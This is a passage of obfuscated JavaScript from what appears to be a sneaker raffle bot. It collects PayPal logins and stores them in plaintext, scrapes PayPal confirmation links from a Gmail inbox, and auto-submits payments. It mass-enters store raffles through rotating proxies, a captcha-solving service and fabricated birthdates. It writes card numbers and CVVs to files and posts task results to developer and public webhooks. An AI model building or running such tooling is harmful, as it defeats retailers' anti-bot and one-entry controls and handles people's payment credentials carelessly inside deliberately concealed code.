        let _0x538255 = _0x25c736['parse'](_0x4d4238, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x3b03a6 = 0x0; _0x3b03a6 < _0x538255['length']; _0x3b03a6++) {
            console['log']('(' + _0x3b03a6 + ')\x20' + _0x538255[_0x3b03a6]['Email']);
        }
        console['log']('\x0a(' + _0x538255['length'] + ')\x20' + _0x16a3a0['cyan']('Add\x20a\x20new\x20account'));
        let _0x9df911 = await _0x125485['get']('Option');
        if (_0x9df911['Option'] < _0x538255['length'])
            return _0x538255[_0x9df911['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x2cc998 = {}, _0x2b649c = await _0x125485['get']('Email');
        _0x2cc998['Email'] = _0x2b649c['Email'];
        var _0x24e3db = Math['round'](Math['random']() * (_0x48def7['length'] - 0x1));
        _0x2cc998['Proxy'] = _0x48def7[_0x24e3db], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x20fc28 = await _0x125485['get']('Password');
        return _0x2cc998['Password'] = _0x20fc28['Password'], _0x7a56eb['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x2cc998['Email'] + ',' + _0x2cc998['Password'] + ',' + _0x2cc998['Proxy']), _0x2cc998;
    }
    let _0xc0f621 = await _0x17e451();
    var _0x816993 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x1672e9 = await _0x125485['get']('Amount'), _0xd74708 = _0x1672e9['Amount'];
    async function _0x599aed() {
        let _0x19ed15 = 0x0;
        var _0x3553b0 = new _0x4d6860({
            'user': _0x342ed0['masterMail'],
            'password': _0x342ed0['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x29215b(_0x17d0a1) {
            _0x3553b0['openBox']('INBOX', ![], _0x17d0a1);
        }
        _0x3553b0['once']('ready', function () {
            _0x29215b(function (_0x2e7c7d, _0x4bf9c5) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x2e7c7d)
                    throw _0x2e7c7d;
                _0x3553b0['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x31ec00, _0x495d9f) {
                    if (!_0x495d9f || !_0x495d9f['length'])
                        console['log'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20No\x20mails\x20found'), _0x3553b0['end']();
                    else {
                        _0x495d9f = _0x495d9f['slice'](0x0, _0xd74708);
                        var _0x474146 = _0x3553b0['seq']['fetch'](_0x495d9f, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x474146['on']('message', function (_0x107b96, _0x3712d5) {
                            var _0x5cf61a = '(#' + _0x3712d5 + ')\x20';
                            _0x107b96['on']('body', function (_0x2d501f, _0x4e0e46) {
                                _0x502d57(_0x2d501f, (_0x26f93e, _0x6a144f) => {
                                    if (_0x6a144f['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x6a144f['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x6a144f['text']['split']('[')[0x2];
                                        var _0x2d63f8 = mes['split'](']')[0x0];
                                        _0x816993['push'](_0x2d63f8);
                                    }
                                });
                            }), _0x107b96['once']('end', function () {
                                _0x19ed15++;
                            });
                        }), _0x474146['once']('error', function (_0xb9d48e) {
                            console['log']('Fetch\x20error:\x20' + _0xb9d48e);
                        }), _0x474146['once']('end', function () {
                            _0x3553b0['end']();
                        });
                    }
                });
            });
        }), _0x3553b0['once']('error', function (_0x5be825) {
            console['log'](_0x16a3a0['red'](_0x5be825['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x3553b0['once']('end', async function () {
        }), _0x3553b0['connect']();
    }
    try {
        _0x599aed(), await _0x140651(0xfa0), console['log']('Found\x20' + _0x816993['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x140651(0xfa0);
    }
    var _0x335a47;
    _0x1b4448('' + _0x149df0);
    var _0x19821d = _0xc0f621['Proxy']['split'](':'), _0xd726ee;
    try {
        _0xd726ee = await _0x51ff47['launch']({
            'userDataDir': 'sessions/' + _0xc0f621['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x19821d[0x0] + ':' + _0x19821d[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0xd726ee = await _0x51ff47['launch']({
            'userDataDir': 'sessions/' + _0xc0f621['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x19821d[0x0] + ':' + _0x19821d[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Getting\x20Session');
        const _0x5d99bb = await _0xd726ee['newPage']();
        await _0x5d99bb['authenticate']({
            'username': '' + _0x19821d[0x2],
            'password': '' + _0x19821d[0x3]
        }), await _0x5d99bb['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5d99bb['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5d99bb['waitForSelector']('#email');
            let _0x3a18cd = await _0x5d99bb['$eval']('#email', _0x3558ae => _0x3558ae['getAttribute']('value'));
            if (_0x3a18cd == '') {
                await _0x5d99bb['type']('#email', _0xc0f621['Email']), await _0x140651(0x1d3);
                let _0x59e739 = await _0x5d99bb['$']('#splitPassword');
                _0x59e739 && (await _0x5d99bb['click']('#btnNext'), await _0x140651(0xa28)), await _0x5d99bb['type']('#password', _0xc0f621['Password']), await _0x140651(0x35c), await _0x5d99bb['click']('#btnLogin');
            } else
                await _0x5d99bb['type']('#password', _0xc0f621['Password']), await _0x140651(0x35c), await _0x5d99bb['click']('#btnLogin');
            await _0x5d99bb['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Successfully\x20logged\x20in'), await _0x140651(0x2710);
        } catch (_0x5758eb) {
            throw new Error('Login\x20session\x20expired\x20' + _0x5758eb);
        }
        for (var _0x20bcaa = 0x0; _0x20bcaa < _0x816993['length']; _0x20bcaa++) {
            console['log'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Task\x20' + (_0x20bcaa + 0x1) + '\x20:\x20Starting\x20Verification'), _0x1b4448(_0x149df0 + '\x20Task\x20' + (_0x20bcaa + 0x1) + '\x20/\x20' + _0x816993['length']);
            const _0x1dcb1c = await _0xd726ee['newPage']();
            await _0x1dcb1c['goto']('' + _0x816993[_0x20bcaa], { 'waitUntil': 'networkidle2' }), await _0x140651(0xbb8);
            try {
                const _0x179329 = await _0x1dcb1c['$']('#challenge-heading');
                _0x179329 && (console['log'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Task\x20' + (_0x20bcaa + 0x1) + '\x20:\x20' + _0x16a3a0['yellow']('2FA\x20Required')), await _0x1dcb1c['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x140651(0x9c40), await _0x1dcb1c['waitForSelector']('#payment-submit-btn'), await _0x1dcb1c['$eval']('#payment-submit-btn', _0x2c4f1c => _0x2c4f1c['click']()), await _0x1dcb1c['click']('#payment-submit-btn');
                try {
                    await _0x1dcb1c['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x140651(0x5dc), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Task\x20' + (_0x20bcaa + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x21613b) {
                    _0x332dc6 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x21613b['message']);
                } finally {
                    if (_0x332dc6 == 'yes' && _0x594317 != 0x2) {
                        console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x149df0['name'] + ']\x20Task\x20' + (_0x20bcaa + 0x1) + '\x20:\x20Retrying\x20(' + _0x594317 + '\x20/\x205)')), _0x20bcaa = _0x20bcaa - 0x1, _0x594317 = _0x594317 + 0x1;
                        continue;
                    }
                    _0x332dc6 == 'yes' && _0x594317 >= 0x2 && (_0x13d7e5(csv[_0x20bcaa], _0x149df0), _0x332dc6 = 'no', _0x594317 = 0x0), await _0x1dcb1c['close'](), await _0x140651(0x4650);
                }
            } catch (_0x2e1c36) {
                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x149df0 + ']\x20Task\x20' + (_0x20bcaa + 0x1) + '\x20:\x20' + _0x2e1c36));
            }
        }
    } catch (_0x4e1f8c) {
        console['log'](_0x16a3a0['red']('' + _0x4e1f8c));
    } finally {
        await _0xd726ee['close']();
    }
}
const _0x2cb44f = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x1a0e0f, _0x3f5b66, _0x289300) {
                _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x342ed0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4c7bbb = 0x0; _0x4c7bbb < _0x3f5b66['length']; _0x4c7bbb++) {
                    if (_0x871294 != 'yes')
                        var _0x871294 = '', _0x136db6 = 0x0;
                    var _0x533a39;
                    try {
                        await _0x58ea73(_0x3f5b66, _0x4c7bbb);
                    } catch {
                        _0x871294 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x1b4448(_0x1a0e0f['name'] + '\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20/\x20' + _0x3f5b66['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                    var _0x12e168 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0xe8a609 = Math['round'](Math['random']() * (_0x12e168['length'] - 0x1));
                    _0x3f5b66[_0x4c7bbb]['Size'] == 'RANDOM' && (_0x3f5b66[_0x4c7bbb]['Size'] = _0x12e168[_0xe8a609]);
                    var _0x56d9e1 = Math['round'](Math['random']() * (_0x289300['length'] - 0x1)), _0x4f858b = _0x289300[_0x56d9e1]['split'](':'), _0x5b0b7c;
                    try {
                        _0x5b0b7c = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4f858b[0x0] + ':' + _0x4f858b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5b0b7c = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4f858b[0x0] + ':' + _0x4f858b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x32043b = await _0x5b0b7c['newPage']();
                        await _0x32043b['authenticate']({
                            'username': '' + _0x4f858b[0x2],
                            'password': '' + _0x4f858b[0x3]
                        }), await _0x32043b['setRequestInterception'](!![]), _0x32043b['on']('request', _0x107135 => {
                            _0x107135['resourceType']() === 'image' || _0x107135['resourceType']() === 'font' || _0x107135['resourceType']() === 'media' ? _0x107135['abort']() : _0x107135['continue']();
                        }), await _0x32043b['goto'](_0x3f5b66[_0x4c7bbb]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x140651(0x3e8), await _0x32043b['waitForSelector']('#accept-all-gdpr'), await _0x32043b['click']('#accept-all-gdpr'), await _0x32043b['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x140651(0xbb8);
                        let _0x340469 = await _0x32043b['$$']('button');
                        for (button of _0x340469) {
                            let _0x50ea78 = await _0x32043b['evaluate'](_0x4bde59 => _0x4bde59['innerHTML'], button);
                            if (_0x50ea78['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x140651(0x1388), await _0x32043b['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Checking\x20Information'), await _0x140651(0x3e8);
                        let _0x52f87b = await _0x32043b['$$']('input[name=\x22email\x22]');
                        await _0x52f87b[0x1]['click'](), await _0x140651(0x12c), await _0x32043b['keyboard']['type'](_0x3f5b66[_0x4c7bbb]['Email']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Nombre\x22]', _0x3f5b66[_0x4c7bbb]['FirstName'] + '\x20' + _0x3f5b66[_0x4c7bbb]['LastName']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Direccion\x22]', _0x3f5b66[_0x4c7bbb]['Address1'] + '\x20' + _0x3f5b66[_0x4c7bbb]['HouseNumber'] + '\x20' + _0x3f5b66[_0x4c7bbb]['Address2']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Ciudad\x22]', _0x3f5b66[_0x4c7bbb]['City']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Provincia\x22]', _0x3f5b66[_0x4c7bbb]['State']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22CP\x22]', _0x3f5b66[_0x4c7bbb]['Zip']), await _0x140651(0x1c2), await _0x32043b['select']('select[name=\x22Pais\x22]', _0x3f5b66[_0x4c7bbb]['Country']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Telefono\x22]', _0x3f5b66[_0x4c7bbb]['Phone']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22cumple\x22]', _0x302585(0x1, 0x14) + '-' + _0x302585(0x1, 0xb) + '-' + _0x302585(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Instagram\x22]', _0x3f5b66[_0x4c7bbb]['Follower']), await _0x140651(0x1c2), await _0x32043b['type']('input[name=\x22Talla\x22]', _0x3f5b66[_0x4c7bbb]['Size']), await _0x140651(0x1f4), await _0x32043b['click']('#sexo_hombre'), await _0x140651(0x1f4), await _0x32043b['click']('#idioma_ingles'), await _0x140651(0x1f4), await _0x32043b['click']('#privacidad_si'), await _0x140651(0x1f4), await _0x32043b['click']('#acepta_suscripcion_si'), await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x27be05 = await _0x32043b['$$']('button');
                        for (button of _0x27be05) {
                            let _0x21807f = await _0x32043b['evaluate'](_0x51ca87 => _0x51ca87['innerHTML'], button);
                            if (_0x21807f['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x140651(0x1388), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x871294 = '';
                        var _0x2cb8a3 = await _0x11b6e5(_0x3f5b66[_0x4c7bbb], _0x1a0e0f, 'dev', ![]), _0x2d8f98 = await _0x11b6e5(_0x3f5b66[_0x4c7bbb], _0x1a0e0f, 'pub', ![]);
                        const _0x4b5c41 = {
                            'succesDEVMSG': { 'embeds': [_0x2cb8a3] },
                            'succesPUBMSG': { 'embeds': [_0x2d8f98] }
                        };
                        try {
                            _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x4b5c41['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x4b5c41['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x4b5c41['succesPUBMSG']);
                        } catch (_0x5b6e99) {
                            console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5b6e99));
                        }
                    } catch (_0x4f21c3) {
                        console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20' + _0x4f21c3)), _0x533a39 = '' + _0x4f21c3;
                        var _0x3032aa = await _0x11b6e5(_0x3f5b66[_0x4c7bbb], _0x1a0e0f, 'dev', !![], _0x533a39), _0x2cb8a3 = await _0x11b6e5(_0x3f5b66[_0x4c7bbb], _0x1a0e0f, 'dev', ![]), _0x2d8f98 = await _0x11b6e5(_0x3f5b66[_0x4c7bbb], _0x1a0e0f, 'pub', ![]);
                        const _0x1ab3ae = {
                            'succesDEVMSG': { 'embeds': [_0x2cb8a3] },
                            'succesPUBMSG': { 'embeds': [_0x2d8f98] }
                        };
                        _0x1ab3ae['errorDEV'] = { 'embeds': [_0x3032aa] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x1ab3ae['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x1ab3ae['errorDEV']), _0x4f21c3 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x871294 = 'yes');
                    } finally {
                        _0x5b0b7c['close']();
                        if (_0x871294 == 'yes' && _0x136db6 != 0x5 && _0x533a39 != 'Size\x20Not\x20Found') {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Task\x20' + (_0x4c7bbb + 0x1) + '\x20:\x20Retrying\x20(' + _0x136db6 + '\x20/\x205)\x20')), _0x4c7bbb = _0x4c7bbb - 0x1, _0x136db6 = _0x136db6 + 0x1;
                            continue;
                        }
                        _0x871294 == 'yes' && _0x136db6 >= 0x5 && (_0x13d7e5(_0x3f5b66[_0x4c7bbb], _0x1a0e0f), _0x871294 = 'no', _0x136db6 = 0x0), console['log'](_0x597cbe() + '\x20[' + _0x1a0e0f['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'ADIDAS\x20CONFIRMED',
        'modules': [
            {
                'name': 'CONFIRMED\x20Account\x20Generator',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x86cf12, _0x40d0fb) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x7a56eb['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x40d0fb) {
                        _0x7a56eb['appendFileSync']('proxies.txt', _0x40d0fb[proxy] + '\x0a');
                    }
                    for (var _0x19040a = 0x0; _0x19040a < _0x86cf12['length']; _0x19040a++) {
                        await _0x58ea73(_0x86cf12, _0x19040a), _0x7a56eb['appendFileSync']('tasks.csv', '\x0a' + _0x86cf12[_0x19040a]['Url'] + ',' + _0x86cf12[_0x19040a]['Size'] + ',' + _0x86cf12[_0x19040a]['Email'] + ',' + _0x86cf12[_0x19040a]['Password'] + ',' + _0x86cf12[_0x19040a]['FirstName'] + ',' + _0x86cf12[_0x19040a]['LastName'] + ',' + _0x86cf12[_0x19040a]['Address1'] + ',' + _0x86cf12[_0x19040a]['Address2'] + ',' + _0x86cf12[_0x19040a]['HouseNumber'] + ',' + _0x86cf12[_0x19040a]['Zip'] + ',' + _0x86cf12[_0x19040a]['City'] + ',' + _0x86cf12[_0x19040a]['Country'] + ',' + _0x86cf12[_0x19040a]['State'] + ',' + _0x86cf12[_0x19040a]['CardNumber'] + ',' + _0x86cf12[_0x19040a]['ExpiryDate'] + ',' + _0x86cf12[_0x19040a]['CVV'] + ',' + _0x86cf12[_0x19040a]['NameOnCard'] + ',' + _0x86cf12[_0x19040a]['Phone'] + ',' + _0x86cf12[_0x19040a]['Follower']);
                    }
                    await _0x140651(0x3e8), _0x315f6a('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempgen.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Info\x20Adder',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0xf4fe6d, _0x3ec8df) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..');
                    for (var _0xa34356 = 0x0; _0xa34356 < _0xf4fe6d['length']; _0xa34356++) {
                        await _0x58ea73(_0xf4fe6d, _0xa34356), _0x7a56eb['appendFileSync']('tasks.csv', '\x0a' + _0xf4fe6d[_0xa34356]['Url'] + ',' + _0xf4fe6d[_0xa34356]['Size'] + ',' + _0xf4fe6d[_0xa34356]['Email'] + ',' + _0xf4fe6d[_0xa34356]['Password'] + ',' + _0xf4fe6d[_0xa34356]['FirstName'] + ',' + _0xf4fe6d[_0xa34356]['LastName'] + ',' + _0xf4fe6d[_0xa34356]['Address1'] + ',' + _0xf4fe6d[_0xa34356]['Address2'] + ',' + _0xf4fe6d[_0xa34356]['HouseNumber'] + ',' + _0xf4fe6d[_0xa34356]['Zip'] + ',' + _0xf4fe6d[_0xa34356]['City'] + ',' + _0xf4fe6d[_0xa34356]['Country'] + ',' + _0xf4fe6d[_0xa34356]['State'] + ',' + _0xf4fe6d[_0xa34356]['CardNumber'] + ',' + _0xf4fe6d[_0xa34356]['ExpiryDate'] + ',' + _0xf4fe6d[_0xa34356]['CVV'] + ',' + _0xf4fe6d[_0xa34356]['NameOnCard'] + ',' + _0xf4fe6d[_0xa34356]['Phone'] + ',' + _0xf4fe6d[_0xa34356]['Follower']);
                    }
                    await _0x140651(0x3e8), _0x315f6a('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempadd.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Entries',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x14c18d, _0x56ade7) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x7a56eb['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x56ade7) {
                        _0x7a56eb['appendFileSync']('proxies.txt', _0x56ade7[proxy] + '\x0a');
                    }
                    for (var _0x561f7f = 0x0; _0x561f7f < _0x14c18d['length']; _0x561f7f++) {
                        await _0x58ea73(_0x14c18d, _0x561f7f), _0x7a56eb['appendFileSync']('tasks.csv', '\x0a' + _0x14c18d[_0x561f7f]['Url'] + ',' + _0x14c18d[_0x561f7f]['Size'] + ',' + _0x14c18d[_0x561f7f]['Email'] + ',' + _0x14c18d[_0x561f7f]['Password'] + ',' + _0x14c18d[_0x561f7f]['FirstName'] + ',' + _0x14c18d[_0x561f7f]['LastName'] + ',' + _0x14c18d[_0x561f7f]['Address1'] + ',' + _0x14c18d[_0x561f7f]['Address2'] + ',' + _0x14c18d[_0x561f7f]['HouseNumber'] + ',' + _0x14c18d[_0x561f7f]['Zip'] + ',' + _0x14c18d[_0x561f7f]['City'] + ',' + _0x14c18d[_0x561f7f]['Country'] + ',' + _0x14c18d[_0x561f7f]['State'] + ',' + _0x14c18d[_0x561f7f]['CardNumber'] + ',' + _0x14c18d[_0x561f7f]['ExpiryDate'] + ',' + _0x14c18d[_0x561f7f]['CVV'] + ',' + _0x14c18d[_0x561f7f]['NameOnCard'] + ',' + _0x14c18d[_0x561f7f]['Phone'] + ',' + _0x14c18d[_0x561f7f]['Follower']);
                    }
                    await _0x140651(0x3e8), _0x315f6a('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/sensor.py'
                    ], { 'shell': !![] });
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x4f6f69, _0x27b9e0, _0x5f2dae) {
                for (var _0x558fbd = 0x0; _0x558fbd < _0x27b9e0['length']; _0x558fbd++) {
                    _0x342ed0['AfewDelay'] = _0x342ed0['delay'];
                    var _0x214a3d;
                    if (_0x4a5bc != 'yes')
                        var _0x4a5bc = '', _0x3df029 = 0x0;
                    var _0x5b8020 = _0x27b9e0[_0x558fbd]['Url'], _0x1c5a32 = _0x27b9e0[_0x558fbd];
                    _0x1b4448(_0x4f6f69['name'] + '\x20Task\x20' + (_0x558fbd + 0x1) + '\x20/\x20' + _0x27b9e0['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                    try {
                        await _0x58ea73(_0x27b9e0, _0x558fbd);
                    } catch {
                        _0x4a5bc = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x3ce185(_0x4071ef) {
                        const _0x4786b7 = _0x7a56eb['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4f9079 = _0x25c736['parse'](_0x4786b7, { 'header': !![] })['data'];
                        let _0x3d0d2b = ![];
                        for (var _0x13b906 of _0x4f9079) {
                            if (_0x13b906['Url'] == _0x4071ef['Url'] && _0x13b906['Email'] == _0x4071ef['Email']) {
                                _0x3d0d2b = !![];
                                break;
                            }
                        }
                        return _0x3d0d2b;
                    }
                    if (await _0x3ce185(_0x27b9e0[_0x558fbd]) == !![]) {
                        console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x14fdca = await _0x11b6e5(_0x27b9e0[_0x558fbd], _0x4f6f69, 'dev', ![]), _0x43f5ec = await _0x11b6e5(_0x27b9e0[_0x558fbd], _0x4f6f69, 'pub', ![]);
                    const _0x34b950 = {
                        'succesDEVMSG': { 'embeds': [_0x14fdca] },
                        'succesPUBMSG': { 'embeds': [_0x43f5ec] }
                    };
                    if (_0x27b9e0[_0x558fbd]['Email'] == '' || _0x27b9e0[_0x558fbd]['FirstName'] == '' || _0x27b9e0[_0x558fbd]['LastName'] == '' || _0x27b9e0[_0x558fbd]['Country'] == '' || _0x27b9e0[_0x558fbd]['Size'] == '' || _0x27b9e0[_0x558fbd]['Address1'] == '' || _0x27b9e0[_0x558fbd]['Zip'] == '') {
                        console['log'](_0x597cbe() + '\x20[' + _0x4f6f69['name'] + ']\x20Task\x20' + (_0x558fbd + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x27b9e0[_0x558fbd]['Country']['length'] == 0x2 && (_0x27b9e0[_0x558fbd]['Country'] = _0x11f897[_0x27b9e0[_0x558fbd]['Country']]);
                    if (_0x342ed0['useRandomProxy'] = ![])
                        var _0x31a1af = _0x5f2dae[_0x558fbd]['split'](':');
                    else
                        var _0x403430 = Math['round'](Math['random']() * (_0x5f2dae['length'] - 0x1)), _0x31a1af = _0x5f2dae[_0x403430]['split'](':');
                    var _0xd245dd;
                    try {
                        _0xd245dd = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31a1af[0x0] + ':' + _0x31a1af[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xd245dd = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31a1af[0x0] + ':' + _0x31a1af[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
